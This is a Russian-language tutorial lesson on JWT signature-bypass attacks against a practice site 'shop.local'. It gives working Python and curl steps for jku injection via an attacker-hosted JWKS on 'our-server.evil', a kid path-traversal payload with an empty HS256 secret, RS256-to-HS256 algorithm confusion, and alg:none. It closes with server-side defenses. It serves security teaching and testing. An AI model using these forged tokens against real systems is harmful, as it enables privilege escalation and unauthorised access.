В базовом уроке мы подбирали слабый секрет JWT и подделывали payload. Но что, если секрет стойкий? Тогда атакуют не секрет, а **механизм проверки подписи**. JWT-заголовок содержит не только `alg`, но и указатели на ключ — `jwk`, `jku`, `x5u`, `kid`. Если сервер доверяет этим полям, мы можем подсунуть **свой** ключ и подписать токен сами. Разберём эти атаки.

Возьмём `shop.local`, где сервер принимает JWT и подписывает их асимметрично (RS256).

## Наш пример: токен с указателем на ключ

Логинимся и декодируем заголовок токена:

```bash
$ curl -s 'https://shop.local/api/login' -d 'user=alice&pass=alice123'
{"access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIiwianVrdSI6Imh0dHBzOi8vc2hvcC5sb2NhbC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJzdWIiOiIxMDAxIn0.sig"}
$ echo 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIiwianVrdSI6Imh0dHBzOi8vc2hvcC5sb2NhbC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ' | base64 -d
{"alg":"RS256","kid":"key-1","jku":"https://shop.local/.well-known/jwks.json"}
```

Здесь два интересных поля: **`kid`** («какой ключ использовать») и **`jku`** («где лежит набор ключей» — JWKS). `RS256` — асимметричная подпись: приватным ключом подписывают, публичным проверяют. Публичный ключ сервер берёт из JWKS по адресу в `jku`.

## Шаг 1: атака через `jku` (подмена источника ключа)

Идея: если сервер слепо доверяет `jku`, мы укажем **свой** URL с **своим** JWKS, подпишем токен своим приватным ключом — и проверка пройдёт. Сгенерируем пару ключей и опубликуем публичный:

```bash
$ python3 - <<'EOF'
from jwcrypto import jwk
key = jwk.JWK.generate(kty='RSA', size=2048)
open('priv.json','w').write(key.export_private())
open('pub.json','w').write(key.export_public())   # это отдаём как JWKS
EOF
```

Наш сервер отдаёт `pub.json` по адресу `https://our-server.evil/jwks.json`. Теперь формируем токен с `"jku":"https://our-server.evil/jwks.json"` и подписываем своим ключом:

```bash
$ python3 - <<'EOF'
from jwcrypto import jwt, jwk
key = jwk.JWK.from_json(open('priv.json').read())
token = jwt.JWT(header={"alg":"RS256","jku":"https://our-server.evil/jwks.json"},
                claims={"sub":"1","role":"admin"})
token.make_signed_token(key)
print(token.serialize())
EOF
```

Подставляем этот токен в запрос:

```bash
$ curl -s 'https://shop.local/api/admin/users' -H 'Authorization: Bearer <наш токен>'
{"users":[{"id":1,"name":"admin"},...]}
```

Сервер сходил на наш `jku`, взял наш публичный ключ, проверил нашу подпись — и поверил, что мы админ. Мы не ломали криптографию: мы подменили **источник доверия**. Поля `jwk` (ключ прямо в заголовке) и `x5u` (ссылка на сертификат) работают так же.

## Шаг 2: инъекция в `kid`

Поле `kid` выбирает ключ из набора. Если сервер использует его небезопасно, возможны:

- **Path traversal:** `kid: "../../dev/null"` → ключом станет пустой файл, и подпись HS256 с пустым секретом совпадёт.
- **SQL-инъекция:** если `kid` подставляется в запрос к базе ключей, можно вернуть нужный ключ.
- **Command injection:** если `kid` идёт в команду чтения файла.

Пример для пустого ключа:

```bash
$ python3 - <<'EOF'
import jwt
print(jwt.encode({"sub":"1","role":"admin"}, "", algorithm="HS256",
      headers={"kid":"../../../../dev/null"}))
EOF
```

Если сервер читает ключ по `kid` и находит пустой файл, HS256 с пустым секретом пройдёт.

## Шаг 3: путаница алгоритмов (alg confusion)

Классическая атака: сервер ждёт **RS256** и хранит публичный ключ. Если библиотека позволяет переключить `alg` на **HS256**, она проверит подпись **тем же публичным ключом как HMAC-секретом**. Публичный ключ мы знаем (он открыт!) — значит, можем подписать токен HS256 этим ключом, и проверка пройдёт:

```bash
$ python3 - <<'EOF'
import jwt
pub = open('public.pem','rb').read()   # публичный ключ сервера, он открыт
print(jwt.encode({"sub":"1","role":"admin"}, pub, algorithm="HS256"))
EOF
```

Уязвимость не в криптографии, а в том, что сервер **верит полю `alg` из токена**, а не фиксирует алгоритм у себя.

## Шаг 4: `alg: none` и другие мелочи

Самый простой вариант — `"alg":"none"` (токен без подписи). Некоторые библиотеки принимали его, если явно не запрещено. Проверяется тривиально: заменить `alg`, убрать подпись (оставить точку) и отправить. Родственные слабости — непроверка `exp` (срок жизни), отсутствие проверки `iss`/`aud` (кто выдал, для кого) и доверие `sub` без сверки с базой.

## Шаг 5: почему это происходит

Все эти атаки — про **доверие к данным, которые контролирует клиент**. Заголовок JWT — это ввод от пользователя. Сервер, который выбирает алгоритм, ключ или источник ключа **по содержимому токена**, отдаёт нам контроль над проверкой подписи. Правильно — фиксировать алгоритм и ключ на сервере и не доверять `jku`/`jwk`/`x5u`/`kid` из непроверенного заголовка.

## Шаг 6: как проверять на практике

- **Декодируй заголовок** — есть ли `jku`, `jwk`, `x5u`, `kid`? Если да — кандидат на атаку.
- **Тест `alg:none`** — убери подпись и посмотри, примет ли сервер.
- **Тест confusion** — подпиши HS256 публичным ключом (если он доступен).
- **Тест `kid`** — подставь `../../dev/null`, SQL-строку, команду.
- **Тест `jku`** — укажи свой JWKS и проверь, сходит ли сервер.

Все тесты делай **безопасно** (на своём аккаунте) и подтверждай, что сервер действительно принял подделку (доступ к защищённому ресурсу).

## Шаг 7: как устроен JWKS и почему он уязвим

Разберём подробнее, что такое `jku`, — это ядро самой популярной атаки. **JWKS** (JSON Web Key Set) — это JSON-документ со списком публичных ключей сервера:

```json
{ "keys": [ { "kty":"RSA", "kid":"key-1", "n":"0vx7...", "e":"AQAB" } ] }
```

Сервер обычно публикует его на `/.well-known/jwks.json` и берёт оттуда ключ для проверки подписи. Поле `jku` в токене говорит: «возьми ключи вот отсюда». Пока `jku` указывает на доверенный домен, всё нормально. Но если сервер **проверяет адрес недостаточно строго** (например, только «начинается с `https://`»), мы подставляем свой домен. Дальше сервер скачивает **наши** ключи и проверяет **нашу** подпись — и доверяет токену. Поле `jwk` — то же самое, но ключ встроен прямо в заголовок, а `x5u` ссылается на сертификат. Все три — «укажи свой источник доверия», и все три опасны при слабой проверке.

## Шаг 8: как защищаться и что проверять

Правильная защита проста по идее: **не доверять клиентским указателям на ключ**. Сервер должен фиксировать алгоритм и использовать ключи только из своего хранилища, а `jku`/`jwk`/`x5u`/`kid` из токена — игнорировать или строго валидировать по allowlist. На практике проверяй:

- **Есть ли в заголовке `jku`/`jwk`/`x5u`/`kid`** — если да, это кандидат.
- **Строгость проверки `jku`** — подставь свой домен; сервер сходит?
- **Доступен ли публичный ключ** — если да, пробуй HS256-confusion.
- **Как обрабатывается `kid`** — path traversal/SQL/команда.
- **Фиксирован ли `alg`** — или берётся из токена.

Подтверждай каждый успех **доступом к защищённому ресурсу**: «токен принят» без последствий — не доказательство.

## Что мы теперь знаем

- JWT-заголовок — это ввод; поля `jku`/`jwk`/`x5u`/`kid` указывают, какой ключ использовать.
- **`jku`/`jwk`/`x5u` injection** — подсовываем свой ключ → подписываем токен сами.
- **`kid` injection** — path traversal/SQL/команда при выборе ключа.
- **alg confusion** — HS256 публичным ключом обходит RS256-проверку.
- **`alg:none`** и непроверка `exp`/`iss`/`aud` — базовые слабости.
- Корень всех — доверие к клиентским данным при проверке подписи.

## На что смотреть дальше

- **Всегда декодируй header** — атака начинается с `jku`/`jwk`/`x5u`/`kid`.
- **Публичный ключ сервера** — если доступен, сразу пробуй HS256-confusion.
- **Проверяй `exp`/`iss`/`aud`** — их отсутствие расширяет impact.
- **Подтверждай доступом:** успешный запрос к защищённому ресурсу, а не «токен принят».

## Куда дальше

Мы ломали JWT, подсовывая свой ключ. Но есть и другой жизненный цикл токена — **refresh-токены**, которые живут долго и продлевают сессию. Если их ротация сломана, одна кража даёт доступ надолго. Об этом — следующий урок.

## Где пригодится

- **CTF (Web):** JWT-задачи почти всегда крутятся вокруг `jku`/`kid`/confusion.
- **Bug bounty:** обход подписи JWT → привилегии; докажи доступ к защищённому ресурсу.
- **Пентест:** обязательная проверка заголовка токена и обработки `alg`/`kid`.
- **Работа (AppSec):** фиксировать алгоритм и ключ, не доверять `jku`/`jwk`/`x5u`/`kid` из токена.
